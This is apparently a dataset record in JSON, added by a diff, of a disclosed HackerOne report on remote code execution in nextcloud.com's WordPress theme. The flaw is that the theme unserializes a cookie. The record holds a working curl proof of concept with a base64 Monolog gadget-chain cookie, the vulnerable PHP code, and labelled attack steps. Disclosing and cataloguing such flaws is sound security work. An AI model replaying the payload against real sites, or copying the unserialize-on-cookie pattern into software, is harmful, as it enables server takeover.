@@ -1,0 +1,38 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "lukasreschke ",
+  "title": "RCE on Wordpress website",
+  "content": "\nThere is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input.\nProof of concept\nThe following command will execute the system('id') command on the host. As gadget chain I've used Monolog which is included in the PodLove WordPress plugin used on nextcloud.com:\nCode 602 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: nextcloud.com' \\\n3    -b $'nc_cookie_banner={\\\"essentials\\\":true,\\\"convenience\\\":false,\\\"statistics\\\":{\\\"matomo\\\":false},\\\"external_media\\\":{\\\"youtube\\\":false,\\\"vimeo\\\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \\\n4    $'https://nextcloud.com/newsletter/'\nThe last line of the response will contain the output of the id command:\nCode 197 Bytes\n1<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)\n2uid=33(www-data) gid=33(www-data) groups=33(www-data)\nVulnerable lines of code\nThe unserialize call in the below code paths is performed on user-input. ($_COOKIE['nc_form_fields'])\nhttps://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114\nCode 1.03 KiB\n1add_filter( 'ninja_forms_render_default_value', 'nc_change_nf_default_value', 10, 3 );\n2function nc_change_nf_default_value( $default_value, $field_type, $field_settings ) {\n3    \n4    if(isset($_COOKIE['nc_form_fields'])){\n5        $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));\n6\n7        if( str_contains($field_settings['key'], 'name') && !str_contains($field_settings['key'], 'organization') ){\n8                if(isset($nc_form_fields['nc_form_name'])) {\n9                    $default_value = $nc_form_fields['nc_form_name'];\n10                }\n11        }\n12        if( str_contains($field_settings['key'], 'email') ){\n13                if(isset($nc_form_fields['nc_form_email'])) {\n14                    $default_value = $nc_form_fields['nc_form_email'];\n15                }\n16        }\n17        if( str_contains($field_settings['key'], 'phone') ){\n18                if(isset($nc_form_fields['nc_form_phone'])) {\n19                    $default_value = $nc_form_fields['nc_form_phone'];\n20                }\n21        }\n22    }\n23\n24  return $default_value;\n25}\nhttps://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L431\nCode 1.17 KiB\n1add_filter( 'ninja_forms_render_options', function( $options, $settings ) {\n2    \n3    //https://www.html-code-generator.com/php/array/languages-name-and-code\n4    $languages_list = array(\n5        'en' => 'English',\n6        // [snip]\n7        'zu' => 'Zulu - isiZulu'\n8    );\n9\n10    if(str_contains($settings['key'], 'language')) {\n11\n12        $options = [];\n13        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);\n14\n15        $pref_lang = '';\n16        if(isset($_COOKIE['nc_form_fields'])){\n17            $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));\n18            if( isset($nc_form_fields['nc_form_lang'])){\n19                $pref_lang = $nc_form_fields['nc_form_lang'];\n20            }\n21        } else {\n22            $pref_lang = $browser_lang;\n23        }\n24\n25\n26        foreach($languages_list as $code => $language) {\n27            $selected = false;\n28\n29            if($pref_lang == $code){\n30                $selected = true;\n31            }\n32\n33            $options[] = [\n34                'label' => $language,\n35                'value' => $code,\n36                'calc' => 0,\n37                'selected' => $selected\n38            ];\n39\n40        }\n41        \n42    }\n43  \n44    return $options;\n45}, 10, 2 );\nImpact\nRCE on the nextcloud.com WordPress instance. I have not tried to escalate up from the host, but I'd assume there is plenty of privilege escalation potential. (or at least the ability to set malicious download links for the Nextcloud binaries)\n\n",
+  "severity": [
+    9.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Deserialization of Untrusted Data"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1703779860,
+  "report_url": "https://hackerone.com/reports/2248328",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP GET request to 'https://nextcloud.com/newsletter/' with a malicious 'nc_form_fields' cookie containing a serialized Monolog gadget chain that executes arbitrary commands (e.g., 'id') when deserialized."
+    ],
+    [
+      2,
+      "Observe the command output (e.g., 'uid=33(www-data) gid=33(www-data) groups=33(www-data)') in the response, confirming RCE."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) in the NextCloud WordPress theme due to unsafe deserialization of user-controlled cookie data ('nc_form_fields'). The deserialization occurs in the 'ninja_forms_render_default_value' and 'ninja_forms_render_options' filters, allowing an attacker to exploit a Monolog gadget chain (via the PodLove plugin) to execute arbitrary commands on the server.",
+  "reason": "The attack involves understanding PHP object injection via deserialization, identifying a usable gadget chain (Monolog in this case), and crafting a malicious payload. While the exploitation steps are straightforward once the gadget chain is known, discovering the vulnerable deserialization point and identifying the correct gadget chain requires expertise in PHP deserialization vulnerabilities and familiarity with common WordPress plugin libraries.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
